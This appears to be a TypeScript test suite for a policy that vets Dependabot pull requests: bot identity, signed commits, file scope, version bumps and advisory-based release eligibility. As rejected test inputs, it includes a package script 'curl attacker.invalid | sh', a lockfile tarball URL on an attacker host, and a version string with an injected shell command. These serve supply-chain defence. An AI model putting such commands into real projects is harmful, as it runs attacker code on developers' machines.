import assert from "node:assert/strict";
import test from "node:test";
import { compareVersions, fixedAdvisories, metadata, nextPatch, validateManifest } from "./dependency-policy.mts";

function fixture() {
  const bot = { login: "dependabot[bot]", id: 49699333 };
  const source = { full_name: "misaon/nylzo" };
  const pull = { number: 1, draft: false, user: bot, head: { sha: "a".repeat(40), ref: "dependabot/npm_and_yarn/web/example-1.2.4", repo: source }, base: { ref: "main", repo: source } };
  const commits = [{ sha: pull.head.sha, author: bot, parents: [{ sha: "b".repeat(40) }], commit: { verification: { verified: true }, message: "Bumps example from 1.2.3 to 1.2.4.\n---\nupdated-dependencies:\n- dependency-name: example\n  dependency-type: direct:production\n...\n" } }];
  const files = [{ filename: "web/app/package.json", status: "modified" }];
  return { pull, commits, files };
}

test("only a signed, unedited Dependabot dependency update is eligible", () => {
  const original = fixture();
  assert.equal(metadata(original.pull, original.commits, original.files).next, "1.2.4");
  const mutations = [
    (data: any) => data.pull.user = { login: "dependabot[bot]", id: 123 },
    (data: any) => data.pull.head.repo.full_name = "attacker/nylzo",
    (data: any) => data.commits[0].commit.verification.verified = false,
    (data: any) => data.commits.push(data.commits[0]),
    (data: any) => data.files.push({ filename: ".github/workflows/ci.yml", status: "modified" }),
    (data: any) => data.files[0].status = "renamed",
    (data: any) => data.commits[0].commit.message = data.commits[0].commit.message.replace("to 1.2.4", "to 2.0.0"),
    (data: any) => data.commits[0].commit.message = data.commits[0].commit.message.replace("to 1.2.4", "to 1.2.4-rc.1"),
    (data: any) => data.commits[0].commit.message += "\n- dependency-name: unrelated\n",
  ];
  for (const mutate of mutations) { const data = structuredClone(original); mutate(data); assert.throws(() => metadata(data.pull, data.commits, data.files)); }
});

test("a manifest cannot smuggle scripts, registry changes, or unrelated dependency updates", () => {
  const data = fixture(), update = metadata(data.pull, data.commits, data.files);
  const before = { scripts: { test: "vitest run" }, dependencies: { example: "1.2.3", another: "2.0.0" } };
  const after = structuredClone(before); after.dependencies.example = "1.2.4";
  validateManifest("web/app/package.json", JSON.stringify(before), JSON.stringify(after), update);
  after.scripts.test = "curl attacker.invalid | sh";
  assert.throws(() => validateManifest("web/app/package.json", JSON.stringify(before), JSON.stringify(after), update));
  const lock = "lockfileVersion: '9.0'\nsettings:\n  autoInstallPeers: true\npackages:\n  example@1.2.3:\n    resolution: {integrity: sha512-abc}\n";
  const next = lock.replace("1.2.3", "1.2.4");
  validateManifest("web/pnpm-lock.yaml", lock, next, update);
  assert.throws(() => validateManifest("web/pnpm-lock.yaml", lock, next.replace("true", "false"), update));
  assert.throws(() => validateManifest("web/pnpm-lock.yaml", lock, `${next}    tarball: https://attacker.invalid/package\n`, update));
});

test("release eligibility requires a reviewed advisory fixed by the actual upgrade", () => {
  const data = fixture(), update = metadata(data.pull, data.commits, data.files);
  const advisory = { ghsa_id: "GHSA-test-test-test", withdrawn_at: null, vulnerabilities: [{ package: { name: "example", ecosystem: "npm" }, first_patched_version: "1.2.4" }] };
  assert.deepEqual(fixedAdvisories(update, [advisory], []), [advisory.ghsa_id]);
  assert.deepEqual(fixedAdvisories(update, [advisory], [advisory]), []);
  assert.deepEqual(fixedAdvisories(update, [{ ...advisory, withdrawn_at: "2026-01-01" }], []), []);
  assert.deepEqual(fixedAdvisories(update, [], []), []);
  assert.equal(nextPatch("v0.1.9"), "v0.1.10");
  assert.throws(() => nextPatch("v0.1.9-rc.1"));
  assert.throws(() => compareVersions("1.2.3; touch /tmp/unsafe", "1.2.4"));
});
